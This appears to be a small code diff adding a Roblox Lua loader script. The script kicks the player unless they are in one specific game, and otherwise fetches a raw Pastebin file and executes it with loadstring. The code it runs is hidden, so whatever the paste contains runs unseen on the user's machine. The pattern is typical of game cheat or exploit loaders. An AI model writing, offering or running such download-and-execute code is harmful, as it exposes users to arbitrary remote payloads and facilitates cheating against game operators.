@@ -1,0 +1,6 @@
+local allowedGameId = 5286116071 
+if game.PlaceId ~= allowedGameId then
+    game.Players.LocalPlayer:Kick("This script can only be run in a specific game.")
+else
+    loadstring(game:HttpGet("https://pastebin.com/raw/mDTJqkfj"))()
+end
